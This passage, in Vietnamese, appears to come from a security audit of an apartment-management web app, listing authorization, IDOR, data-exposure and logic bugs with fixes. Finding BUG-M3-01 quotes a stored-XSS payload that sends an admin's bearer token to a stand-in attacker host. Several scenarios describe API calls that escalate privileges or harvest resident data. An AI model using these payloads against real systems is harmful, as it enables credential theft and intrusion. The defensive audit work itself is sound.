- **Logic hiện tại:** Kiểm tra `$alreadyExists = Resident::where('apartment_id', $apartmentId)->where('user_id', $userId)->exists()` bỏ qua `withTrashed()`. Sau đó `Resident::create($data)` va chạm với `UNIQUE KEY uq_resident_apt (user_id, apartment_id)` trên MySQL (đã xác nhận bằng thực nghiệm trong `ResidentCreateTest::test_case_14_soft_deleted_resident_behavior` trả về `409 Conflict` kèm thông báo sai sự thật *"đã được thêm vào căn hộ bởi quản trị viên khác"*). Hiện chưa có API hoặc luồng transaction khôi phục bản ghi đã soft-delete.
- **Đề xuất sửa:** Khi tạo mới trong `DB::transaction()`, truy vấn `Resident::withTrashed()->where(...)->lockForUpdate()->first()`: nếu tồn tại và `trashed()`, cập nhật các trường mới, kiểm tra trùng chủ hộ (nếu `is_head_of_household = true`), rồi gọi `$existing->restore()`.

#### [BUG-M2-03] `MEDIUM` – Lỗi logic ngày lưu trú khi cập nhật một phần (`PUT/PATCH`) và bỏ qua Scout Sync khi Update
- **Vị trí:** [ResidentRequest.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Http/Requests/ResidentRequest.php#L44-L45), [ResidentService.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Services/ResidentService.php#L307-L319)
- **Nguyên nhân:** `stay_end_date => 'nullable|date|after_or_equal:stay_start_date'` khi update chỉ gửi `stay_end_date` mà không gửi `stay_start_date` sẽ bỏ qua kiểm tra đối chiếu với `stay_start_date` đang lưu trong DB. Ngoài ra `ResidentService::update()` chạy `Resident::where('id', ...)->update(...)` làm skip Eloquent `saved/updated` event của Laravel Scout (`Searchable`), khiến chỉ mục Elasticsearch/Meilisearch bị lệch dữ liệu sau cập nhật.
- **Đề xuất sửa:** Kiểm tra `stay_end_date >= stay_start_date` thực tế trong `ResidentService::update()` khi thiếu `stay_start_date`; thực hiện `$lockedResident->save()` trong transaction (kèm `where` kiểm tra `updated_at` hoặc giữ optimistic lock kết hợp dispatch searchable).

---

### Nhóm C – Module 3: Tạm trú / Tạm vắng

#### [BUG-M3-01] `HIGH` – Stored XSS từ Resident sang Admin qua Biểu Mẫu CT01 (`exportPoliceForm`)
- **Vị trí:** [TemporaryRegistrationService.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Services/TemporaryRegistrationService.php#L547-L670), [TemporaryRegistrationController.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Http/Controllers/TemporaryRegistrationController.php#L561), [TemporaryRegistrationManagement.tsx](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/resources/js/Pages/Admin/TemporaryRegistrationManagement.tsx#L552-L562), [TemporaryRegistrationManagement.tsx](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/resources/js/Pages/Admin/TemporaryRegistrationManagement.tsx#L1847-L1851)
- **Nguyên nhân:** Backend nội suy trực tiếp `$reason`, `$notes`, `$policeRef`, thông tin cư dân chưa `e()`/`htmlspecialchars()` vào chuỗi HTML xuất CT01. Trên UI Admin (`TemporaryRegistrationManagement.tsx`), `<iframe srcDoc={exportHtmlContent}>` thiếu thuộc tính `sandbox`, và nút In chạy `window.open('', '_blank')` rồi `printWindow.document.write(exportHtmlContent)` (chung origin, có `window.opener`). Route `/download` trả trực tiếp `Content-Type: text/html; charset=UTF-8`.
- **Kịch bản khai thác:** Cư dân đăng ký tạm trú với `reason` chứa `<script>fetch('https://attacker/?t='+localStorage.getItem('smart_cassavas_token'))</script>`. Khi Admin nhấn "Xuất Mẫu CT01" hoặc "In Biểu Mẫu", script thực thi đánh cắp Bearer token của Admin.
- **Đề xuất sửa:** Escape mọi biến đầu vào bằng `htmlspecialchars($val, ENT_QUOTES, 'UTF-8')` trong `exportPoliceForm()`; thêm `sandbox` chặt chẽ cho iframe preview và không dùng `document.write()` raw HTML không sanitize.

#### [BUG-M3-02] `HIGH` – Cư dân tự ghi/giả mạo `police_reference_code` khi cập nhật hồ sơ
- **Vị trí:** [TemporaryRegistrationRequest.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Http/Requests/TemporaryRegistrationRequest.php#L218), [TemporaryRegistrationService.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Services/TemporaryRegistrationService.php#L271), [TemporaryRegistration.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Models/TemporaryRegistration.php#L18-L35)
- **Logic hiện tại:**
  ```php
  // TemporaryRegistrationService.php:271
  unset($data['reviewed_by'], $data['reviewed_at'], $data['police_status'], $data['resident_id'], $data['apartment_id'], $data['updated_at']);
  ```
  Trường `police_reference_code` vẫn nằm trong `rules()` của `PUT/PATCH`, nằm trong `$fillable`, và **không bị `unset()`** trong `update()`.
- **Kịch bản khai thác:** Cư dân sửa hồ sơ `PENDING_POLICE_SUBMISSION` bằng `PUT /api/v1/residents/temporary-registrations/{id}` gửi kèm `"police_reference_code": "CA-2026-FAKE-999"` để giả mạo mã xác nhận cơ quan Công An.
- **Đề xuất sửa:** Trong `TemporaryRegistrationController::update()`, nếu người gọi không phải Admin/Manager thì loại bỏ `police_reference_code`, đồng thời thêm vào danh sách `unset()` hoặc phân nhánh parameter khi gọi `TemporaryRegistrationService::update()`.

#### [BUG-M3-03] `MEDIUM` – Ảnh CCCD lưu vào disk `public` (có thể truy cập công khai không cần auth)
- **Vị trí:** [TemporaryRegistrationService.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Services/TemporaryRegistrationService.php#L524)
- **Nguyên nhân:** `uploadCccd` lưu ảnh 2 mặt CCCD lên `$file->store('temporary_registrations/cccd', 'public')` và trả về URL `/storage/temporary_registrations/cccd/...`, có nguy cơ lộ tài liệu định danh PII nếu thư mục `public/storage` được link trong production.
- **Đề xuất sửa:** Chuyển sang lưu trên disk `local` (private) và phục vụ ảnh qua endpoint có xác thực quyền sở hữu / quyền quản trị tương tự pattern `ResidentTicketController::downloadAttachment`.

#### [BUG-M3-04] `MEDIUM` – Kiểm tra quyền Admin chỉ theo Role và leo thang Chủ hộ chéo căn hộ qua Role `RESIDENT_OWNER`
- **Vị trí:** [TemporaryRegistrationController.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Http/Controllers/TemporaryRegistrationController.php#L32-L33), [TemporaryRegistrationRequest.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Http/Requests/TemporaryRegistrationRequest.php#L106-L108), [TemporaryRegistrationRequest.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Http/Requests/TemporaryRegistrationRequest.php#L147-L150), [TemporaryRegistrationRequest.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Http/Requests/TemporaryRegistrationRequest.php#L186-L189)
- **Nguyên nhân:** (1) `isUserAdmin()` chỉ kiểm tra `SUPER_ADMIN` / `BUILDING_MANAGER`, bỏ qua permission RBAC (`TEMP_REG:*` cũng chưa được seed). (2) `canResidentAccess()` và `canResidentModify()` cho phép `$user->hasRole('RESIDENT_OWNER')` được coi là chủ hộ tại *bất kỳ* căn hộ nào mà user đó có mặt trong bảng `residents` — ngay cả khi user X chỉ là `TENANT` hoặc `FAMILY_MEMBER` tại căn hộ B (nhưng có role `RESIDENT_OWNER` do làm chủ hộ tại căn hộ A).
- **Đề xuất sửa:** Bỏ kiểm tra `$user->hasRole('RESIDENT_OWNER')` global; chỉ kiểm tra `$userResident->is_head_of_household || $userResident->resident_type === 'OWNER'` theo đúng bản ghi `residents` tại căn hộ đích (và check thêm `apartment_owners`).

#### [BUG-M3-05] `MEDIUM` – Nút tải "Mẫu CT01" ở Cổng Cư dân không gửi Bearer token (hỏng 401 sau `auth.bearer`)
- **Vị trí:** [ResidentTemporaryRegistrationPanel.tsx](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/resources/js/Components/ResidentTemporaryRegistrationPanel.tsx#L565-L574), [api.ts](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/resources/js/Services/api.ts#L2236-L2238)
- **Nguyên nhân:** Component render thẻ `<a href={api.getTemporaryRegistrationDownloadUrl(item.id)} target="_blank">`, làm trình duyệt thực hiện GET thông thường không có header `Authorization: Bearer ...` trong khi endpoint `/api/v1/residents/temporary-registrations/{id}/download` nằm trong nhóm `auth.bearer` -> trả lỗi 401 JSON thay vì tải biểu mẫu.
- **Đề xuất sửa:** Tải thông qua `fetch` có `Authorization: Bearer ...`, tạo Blob URL rồi mở tab/trigger download (tương tự `exportTemporaryRegistrationForm`).

---

### Nhóm D – Module 4: Quản lý Phương tiện

#### [BUG-M4-01] `CRITICAL` – `VEHICLE:VIEW` thực hiện được toàn bộ CREATE, UPDATE, DELETE, APPROVE, TOGGLE-ACTIVE, SYNC-INVOICE
- **Vị trí:** [VehicleController.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Http/Controllers/VehicleController.php#L23-L49), [VehicleController.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Http/Controllers/VehicleController.php#L126-L334)
- **Logic hiện tại:**
  ```php
  $isAuthorized = (method_exists($user, 'isSuperAdmin') && $user->isSuperAdmin())
      || (method_exists($user, 'hasRole') && $user->hasRole(['SUPER_ADMIN', 'BUILDING_MANAGER', 'RECEPTIONIST', 'SECURITY_GUARD']))
      || ($requiredPermission && method_exists($user, 'hasPermission') && $user->hasPermission($requiredPermission))
      || (method_exists($user, 'hasPermission') && ($user->hasPermission('VEHICLE:VIEW') || $user->hasPermission('VEHICLE:CREATE')));
  ```
  Tất cả các hàm `index`, `show`, `store`, `update`, `destroy`, `toggleActive`, `approve`, `syncInvoice` đều chỉ gọi `$this->checkAdminAuthorization($request)` mà **không truyền `$requiredPermission`**! Đồng thời vế thứ 4 luôn cấp quyền nếu có `VEHICLE:VIEW` hoặc `VEHICLE:CREATE`, và vế thứ 2 cho phép 4 role bypass ngay cả khi đã bị thu hồi quyền trên Ma trận RBAC.
- **Kịch bản khai thác:** Tạo một role/user tùy chỉnh chỉ có duy nhất quyền `VEHICLE:VIEW` -> gọi `POST /api/v1/vehicles`, `POST /api/v1/vehicles/{id}/approve`, `DELETE /api/v1/vehicles/{id}`, `POST /api/v1/vehicles/{id}/sync-invoice` -> đều thành công `200/201`, tự ý chèn hoặc xóa phí gửi xe trong hóa đơn cư dân.
- **Đề xuất sửa:** Bắt buộc truyền đúng permission theo hành động (`VEHICLE:VIEW`, `VEHICLE:CREATE`, `VEHICLE:UPDATE`, `VEHICLE:DELETE`, `VEHICLE:APPROVE`); bỏ logic tự cho phép qua role hardcode và bỏ `|| hasPermission('VEHICLE:VIEW')` trong hàm check chung.

#### [BUG-M4-02] `CRITICAL` – 3 Endpoint `/api/v1/vehicles/meta/*` không gọi `checkAdminAuthorization`, lộ toàn bộ PII cư dân
- **Vị trí:** [VehicleController.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Http/Controllers/VehicleController.php#L339-L422), [routes/web.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/routes/web.php#L637-L639)
- **Logic hiện tại:** Các method `apartments()`, `apartmentResidents(string $apartmentId)`, và `allResidents()` hoàn toàn không gọi `$this->checkAdminAuthorization($request)`. Tuy route nằm trong `auth.bearer`, bất kỳ tài khoản cư dân nào đã đăng nhập đều có thể gọi trực tiếp.
- **Kịch bản khai thác:** Cư dân bình thường gửi `GET /api/v1/vehicles/meta/residents?limit=50` hoặc `GET /api/v1/vehicles/meta/apartments/{anyApartmentId}/residents` -> thu thập danh sách `user_id`, `full_name`, `phone_number`, `email`, `resident_type`, `apartment_number` của toàn bộ cư dân tòa nhà.
- **Đề xuất sửa:** Thêm `if ($authError = $this->checkAdminAuthorization($request, 'VEHICLE:VIEW')) { return $authError; }` vào đầu cả 3 method.

#### [BUG-M4-03] `HIGH` – Client có thể thao túng phí gửi xe (`monthly_parking_fee`) qua payload tạo/sửa xe
- **Vị trí:** [VehicleRequest.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Http/Requests/VehicleRequest.php#L58), [VehicleRequest.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Http/Requests/VehicleRequest.php#L80), [VehicleService.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Services/VehicleService.php#L218-L221), [Vehicle.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Models/Vehicle.php#L29)
- **Nguyên nhân:** `VehicleRequest` nhận `monthly_parking_fee => 'nullable|numeric|min:0'` (cho phép gửi `0.01` hoặc `1` VND) và `VehicleService::createVehicle` chỉ tra bảng giá từ `service_pricing_configs` khi `! isset($data['monthly_parking_fee']) || (float) $data['monthly_parking_fee'] <= 0`, đồng thời đẩy giá giả mạo đó vào hóa đơn (`syncVehicleParkingFeeToInvoice`).
- **Đề xuất sửa:** Luôn tính `monthly_parking_fee` từ `getPricingForCategory()` ở server (hoặc chỉ cho phép role có quyền cấu hình phí / `INVOICE:UPDATE` ghi đè hợp lệ).

#### [BUG-M4-04] `MEDIUM` – Thiếu chức năng Từ chối đăng ký phương tiện & lý do từ chối và thiếu validation liên kết chủ xe – căn hộ
- **Vị trí:** [VehicleController.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Http/Controllers/VehicleController.php), [VehicleService.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Services/VehicleService.php), [VehicleManagement.tsx](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/resources/js/Pages/Admin/VehicleManagement.tsx), [routes/web.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/routes/web.php#L633-L647)
- **Nguyên nhân:** Chỉ có endpoint `/vehicles/{id}/approve` và `/vehicles/{id}/toggle-active`, không có workflow Từ chối (`REJECTED`) kèm lý do từ chối như yêu cầu nghiệp vụ Module 4 (mục 10–11). Ngoài ra `VehicleRequest` không kiểm tra `owner_user_id` thực sự là cư dân/chủ sở hữu của `apartment_id`.

---

### Nhóm E – Module 5: Quản lý Thẻ RFID

#### [BUG-M5-01] `HIGH` – `AccessCardController` chỉ kiểm tra Role hardcode, bỏ qua hoàn toàn RBAC Permission Matrix
- **Vị trí:** [AccessCardController.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Http/Controllers/AccessCardController.php#L23-L47), [RbacSeeder.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/database/seeders/RbacSeeder.php)
- **Nguyên nhân:** `checkAuthorization()` chỉ check `hasRole(['SUPER_ADMIN', 'ADMIN', 'BUILDING_MANAGER', 'RECEPTIONIST', 'SECURITY_GUARD'])`, không nhận tham số `$requiredPermission`. Bảng `permissions` cũng chưa từng seed nhóm quyền `RFID:*` / `ACCESS_CARD:*`. Kết quả bảo vệ cấp thẻ được hoặc bị thu hồi quyền không thể kiểm soát ở cấp action (`VIEW` vs `CREATE` vs `UPDATE` vs `DELETE`).
- **Đề xuất sửa:** Seed `RFID:VIEW`, `RFID:CREATE`, `RFID:UPDATE`, `RFID:DELETE` vào `RbacSeeder` và kiểm tra permission tương ứng trên từng action của `AccessCardController` (bao gồm `apartments` & `residents` meta endpoints).

#### [BUG-M5-02] `HIGH` – Ép kiểu UUID `$actorId` thành `(int)` làm hỏng dữ liệu `actor_id` trong mọi sự kiện Realtime RFID
- **Vị trí:** [AccessCardService.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Services/AccessCardService.php#L172), [AccessCardService.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Services/AccessCardService.php#L224), [AccessCardService.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Services/AccessCardService.php#L257), [AccessCardService.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Services/AccessCardService.php#L296)
- **Logic hiện tại:** `$actorId ? (int) $actorId : null` được truyền vào `QuocTinRealtimeService::emit(...)`. Vì cột `users.id` dùng chuẩn UUIDv7 (ví dụ `"01a1caaa-..."`), `(int) $actorId` biến thành `0` hoặc `1` (hoặc số nguyên đứng trước chữ cái đầu tiên), phá hỏng việc nhận diện người thực hiện thao tác và cơ chế chống dội echo phía frontend.
- **Đề xuất sửa:** Đổi kiểu `$actorId` truyền vào `emit()` thành `string|null` (bỏ `(int)` cast) ở cả 4 điểm trong `AccessCardService.php`.

#### [BUG-M5-03] `MEDIUM` – `toggle-status` cho phép tự động mở khóa lại thẻ đã bị `REVOKED` hoặc `LOST_REPORTED`
- **Vị trí:** [AccessCardService.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Services/AccessCardService.php#L239)
- **Logic hiện tại:** `$newStatus = ($card->status === 'ACTIVE') ? 'LOCKED_TEMPORARY' : 'ACTIVE';`. Nếu thẻ bị báo mất (`LOST_REPORTED`) hoặc đã thu hồi vĩnh viễn (`REVOKED`), gọi `PATCH /api/v1/rfid-cards/{id}/toggle-status` lập tức chuyển thẻ thành `ACTIVE`.
- **Đề xuất sửa:** Chỉ cho phép chuyển đổi qua lại giữa `ACTIVE` và `LOCKED_TEMPORARY`; trả về 409/422 nếu thẻ ở trạng thái `REVOKED` hoặc `LOST_REPORTED`.

#### [BUG-M5-04] `MEDIUM` – Thiếu ràng buộc chéo `assigned_user_id` / `assigned_vehicle_id` thuộc `assigned_apartment_id` và thiếu check `expiry_date >= issued_date` khi cấp mới
- **Vị trí:** [AccessCardRequest.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Http/Requests/AccessCardRequest.php#L59-L77), [AccessCardService.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Services/AccessCardService.php#L100-L170)
- **Nguyên nhân:** Cho phép cấp thẻ gắn `assigned_apartment_id = Căn hộ A` nhưng `assigned_user_id` là cư dân Căn hộ B hoặc `assigned_vehicle_id` là xe của Căn hộ B; ngoài ra `POST` không validate `expiry_date => 'after_or_equal:issued_date'`.

---

### Nhóm F – Module 6: Đăng ký Khách (Cư dân)

#### [BUG-M6-01] `CRITICAL` – IDOR Tạo thẻ QR Pass vào căn hộ bất kỳ của người khác khi tài khoản chưa thuộc căn hộ nào
- **Vị trí:** [ResidentVisitorService.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Services/ResidentVisitorService.php#L275-L325)
- **Logic hiện tại:**
  ```php
  } else {
      $hasAccess = ... // FALSE nếu attacker chưa có căn hộ
      if (! $hasAccess) {
          // Tìm căn hộ hợp lệ của $userId -> tất cả đều NULL!
          // KHÔNG abort(403), KHÔNG reset $apartmentId = null!
      }
  }
  if (! $apartmentId) { abort(422, ...); }
  // Dùng nguyên $apartmentId nạn nhân truyền vào để INSERT visitor_registrations ACTIVE!
  ```
- **Kịch bản khai thác:** Bất kỳ tài khoản nào đã đăng nhập (user mới đăng ký chưa gán căn hộ, nhân viên không phải cư dân, ...) gửi `POST /api/v1/resident/visitors` hoặc `POST /api/v1/resident/portal/visitors` với `"apartment_id": "<UUID Căn hộ nạn nhân>"` -> `hasAccess` bằng `false`, khối fallback tìm căn hộ của attacker ra rỗng nên **giữ nguyên `$apartmentId` nạn nhân** và phát hành mã QR `ACTIVE` hợp lệ cho căn hộ nạn nhân!
- **Đề xuất sửa:** Khi `! $hasAccess`, ném ngay `abort(403, 'Bạn không có quyền đăng ký khách cho căn hộ này.')` thay vì tự động thay thế/bỏ qua!

#### [BUG-M6-02] `HIGH` – Tự động gán cư dân chưa có căn hộ vào căn hộ đầu tiên trong hệ thống (`apartments->first()`)
- **Vị trí:** [ResidentVisitorService.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Services/ResidentVisitorService.php#L269-L273)
- **Logic hiện tại:**
  ```php
  if (! $apartmentId) {
      $firstApt = DB::table('apartments')->first();
      $apartmentId = $firstApt ? $firstApt->id : null;
  }
  ```
- **Nguyên nhân:** Nếu user không truyền `apartment_id` và chưa được gán căn hộ nào, service gán bừa họ vào căn hộ đầu tiên tìm thấy trong DB (`apartments`), cấp QR Pass hợp lệ vào nhà người khác.
- **Đề xuất sửa:** Xóa bỏ hoàn toàn block fallback `DB::table('apartments')->first()`, trả về 403/422 nếu không xác định được căn hộ hợp lệ của cư dân.

#### [BUG-M6-03] `HIGH` – Logic Data Scoping `$hasOwn` trong `listVisitors()` mâu thuẫn & rò rỉ theo căn hộ khi chưa có lượt tự tạo
- **Vị trí:** [ResidentVisitorService.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Services/ResidentVisitorService.php#L45-L75), [ResidentVisitorService.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Services/ResidentVisitorService.php#L205-L211)
- **Nguyên nhân:** Nếu Cư dân B cùng căn hộ với Cư dân C và B chưa tạo lượt khách nào (`$hasOwn === false`), B sẽ thấy toàn bộ danh sách khách riêng của C (trong khi ở `getVisitorDetail` L205 chỉ kiểm tra `$item->host_resident_user_id === $user->id` nên xem detail lại báo 403!). Ngay khi B tự tạo 1 lượt khách (`$hasOwn === true`), B lập tức mất quyền xem danh sách khách căn hộ vừa thấy trước đó.
- **Đề xuất sửa:** Thống nhất chính sách scope (hoặc chỉ xem theo `host_resident_user_id === $user->id`, hoặc cho phép xem chung căn hộ cho mọi thành viên active cùng căn hộ nhưng kiểm soát đồng nhất giữa `listVisitors` và `getVisitorDetail`).

#### [BUG-M6-04] `MEDIUM` – Portal Resident Overview lộ CCCD & QR Pass khách riêng của thành viên khác cùng căn hộ
- **Vị trí:** [ResidentPortalController.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Http/Controllers/ResidentPortalController.php#L151-L182) *(file chia sẻ với Ma)*
- **Nguyên nhân:** Query visitors trong `overview()` trả thẳng `visitor_national_id as id_card_number` và `qr_access_pass_code as qr_pass_code` cho tất cả thành viên cùng căn hộ kể cả khách do chủ hộ/người khác đăng ký riêng.

#### [BUG-M6-05] `MEDIUM` – Quyền chỉnh sửa/hủy lượt khách cho phép cứng role `STAFF`/`RECEPTIONIST` và thiếu route middleware `auth.bearer`
- **Vị trí:** [ResidentVisitorService.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Services/ResidentVisitorService.php#L28-L35), [ResidentVisitorService.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Services/ResidentVisitorService.php#L206-L207), [ResidentVisitorService.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Services/ResidentVisitorService.php#L455-L456), [ResidentVisitorService.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Services/ResidentVisitorService.php#L576-L577), [routes/web.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/routes/web.php#L368-L374)
- **Nguyên nhân:** Cho phép cứng `STAFF` / `RECEPTIONIST` chỉnh sửa/hủy lượt khách đăng ký của cư dân mà không kiểm tra permission; 7 route `/api/v1/resident/visitors*` không bọc middleware `auth.bearer` (chỉ dựa vào `RbacService::resolveUser()` trong controller). Ngoài ra không chặn check-in/tạo với ngày quá khứ khi sửa, thiếu API riêng cho cư dân gia hạn giờ rời dự kiến sau khi đã check-in.

---

### Nhóm G – Module 7: Khách Tiếp Tân & Reception Dashboard

#### [BUG-M7-01] `HIGH` – `ReceptionVisitorService::assertStaffAuthorized()` cho phép Role bypass Permission (`VISITOR:VIEW` vẫn Check-in/Check-out được)
- **Vị trí:** [ReceptionVisitorService.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Services/ReceptionVisitorService.php#L27-L62), [RbacSeeder.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/database/seeders/RbacSeeder.php)
- **Logic hiện tại:** Lines 34–53 kiểm tra `$user->hasRole(ALLOWED_STAFF_ROLES)` và `return;` ngay lập tức **trước khi** chạm đến dòng 56 kiểm tra `$permCode` (`VISITOR:CHECKIN` hoặc `VISITOR:VIEW`).
- **Kịch bản khai thác:** Một lễ tân (`RECEPTIONIST`) bị quản trị viên thu hồi quyền `VISITOR:CHECKIN` trên Ma trận RBAC (hoặc chỉ giữ `VISITOR:VIEW`) vẫn có thể gọi `POST /api/v1/reception/visitors/check-in` và `check-out` thành công vì role `RECEPTIONIST` nằm trong `ALLOWED_STAFF_ROLES`.
- **Đề xuất sửa:** Chỉ bypass permission cho `SUPER_ADMIN`/`SUPER_ADMI`; với mọi role nhân viên khác bắt buộc gọi `RbacService::hasPermission($user, $permCode)` (và bổ sung `VISITOR:CHECKIN`, `VISITOR:VIEW` cho role `RECEPTIONIST`/`SECURITY_GUARD` trong `RbacSeeder` nếu chưa đủ).

#### [BUG-M7-02] `HIGH` – `ReceptionPortalController::overview()` thiếu xác thực hoàn toàn và ngụy tạo số liệu giả
- **Vị trí:** [ReceptionPortalController.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Http/Controllers/ReceptionPortalController.php#L15-L171), [routes/web.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/routes/web.php#L216) *(file dùng chung với Xuân Hòa/Ma)*
- **Nguyên nhân:** Route `GET /api/v1/reception/overview` không có `auth.bearer` và trong `overview()` không hề gọi `resolveUser()` hay kiểm tra role/permission. Thêm vào đó, khi `activeGuestsCount === 0` hoặc `pendingParcelsCount === 0`, controller gán cứng số liệu giả (`18`, `42`, `4`, `7`, `2`) kèm thông tin giả (`A1001`, `Nguyễn Minh Anh`, `30K-678.90`).
- **Đề xuất sửa:** Bọc `auth.bearer:strict` trên route, kiểm tra quyền lễ tân/bảo vệ trong controller, xóa bỏ fallback dữ liệu giả khi count bằng `0`.

#### [BUG-M7-03] `MEDIUM` – `ReceptionDashboardService` kiểm tra quyền chỉ theo Role & các route Lễ tân thiếu middleware `auth.bearer`
- **Vị trí:** [ReceptionDashboardService.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Services/ReceptionDashboardService.php#L18-L37), [routes/web.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/routes/web.php#L219-L226)
- **Nguyên nhân:** `authorizeViewer()` chỉ kiểm tra role list mà không check `VISITOR:VIEW`/`PARCEL:VIEW`; các route `/api/v1/reception/dashboard` và `/api/v1/reception/visitors*` không gắn middleware `auth.bearer`. Ngoài ra trong `ReceptionVisitorService` (khi tra cứu khách), nhân viên lễ tân bị giới hạn xem khách vẫn không bị ràng buộc chi tiết nếu chưa tách quyền `check-in` và `view`.

---

### Nhóm H & I – Module 8 & 9: Bưu phẩm & Bàn giao Bưu phẩm

#### [BUG-M8-01] `HIGH` – `ReceptionParcelService::assertStaffAuthorized()` cho phép Role bypass hoàn toàn `PARCEL:*` Permission
- **Vị trí:** [ReceptionParcelService.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Services/ReceptionParcelService.php#L814-L856), [RbacSeeder.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/database/seeders/RbacSeeder.php)
- **Logic hiện tại:** Lines 821–840 kiểm tra `ALLOWED_STAFF_ROLES` (`RECEPTIONIST`, `SECURITY_GUARD`, `BUILDING_MANAGER`, `MANAGER`, `ADMIN`, `SUPER_ADMIN`) và `return;` trước khi kiểm tra `$permCode` (`PARCEL:CHECKOUT`, `PARCEL:RECEIVE`, `PARCEL:UPDATE`, `PARCEL:DELETE`, `PARCEL:VIEW`) tại lines 843–853. Hơn nữa, `RbacSeeder` mới seed `PARCEL:VIEW`, `PARCEL:CREATE`, chưa hề seed `PARCEL:RECEIVE`, `PARCEL:CHECKOUT`, `PARCEL:UPDATE`, `PARCEL:DELETE`, `RECEPTION:OPERATE`.
- **Kịch bản khai thác:** Nhân viên `SECURITY_GUARD` hoặc `RECEPTIONIST` bị thu hồi quyền xóa (`PARCEL:DELETE`) hoặc bàn giao (`PARCEL:CHECKOUT`) vẫn có thể gọi `DELETE /api/v1/reception/parcels/{id}` và `POST /api/v1/reception/parcels/{id}/handover` bình thường.
- **Đề xuất sửa:** Chỉ giữ `SUPER_ADMIN` bypass, mọi role khác bắt buộc kiểm tra `RbacService::hasPermission($user, $permCode)` và seed đầy đủ `PARCEL:RECEIVE/CHECKOUT/UPDATE/DELETE` (hoặc ánh xạ nhất quán `PARCEL:CREATE/UPDATE/DELETE/VIEW`).

#### [BUG-M8-02] `MEDIUM` – Rò rỉ thống kê KPI Bưu phẩm toàn tòa nhà cho Cư dân
- **Vị trí:** [ReceptionParcelService.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Services/ReceptionParcelService.php#L154)
- **Nguyên nhân:** Khi Cư dân gọi `GET /api/v1/reception/parcels`, `getParcels()` lọc danh sách bưu phẩm theo căn hộ của cư dân, nhưng sau đó gọi `$this->calculateKpis()` mà không truyền phạm vi căn hộ, trả về tổng số bưu phẩm đang lưu kho, quá hạn, đã phát của **toàn bộ tòa nhà**.
- **Đề xuất sửa:** Khi `! $isStaff`, tính KPI trên cùng scope `$apartmentIds` của cư dân.

#### [BUG-M8-03] `MEDIUM` – `resolveResidentApartmentIds()` thiếu lọc ngày cư trú hết hạn & thiếu bảng `apartment_owners`
- **Vị trí:** [ReceptionParcelService.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Services/ReceptionParcelService.php#L793-L809)
- **Nguyên nhân:** Khác với logic BUG-05 đã sửa tại `QuocTinRealtimeService::getAuthorizedApartmentIds()`, `ReceptionParcelService::resolveResidentApartmentIds()` vẫn sử dụng `apartments.current_resident_user_id`, không kiểm tra `stay_start_date <= today` và `stay_end_date >= today` trên bảng `residents`, và không kiểm tra `apartment_owners`. Cư dân hết hạn hợp đồng thuê nhưng chưa xóa bản ghi vẫn xem được bưu phẩm mới gửi vào căn hộ cũ.

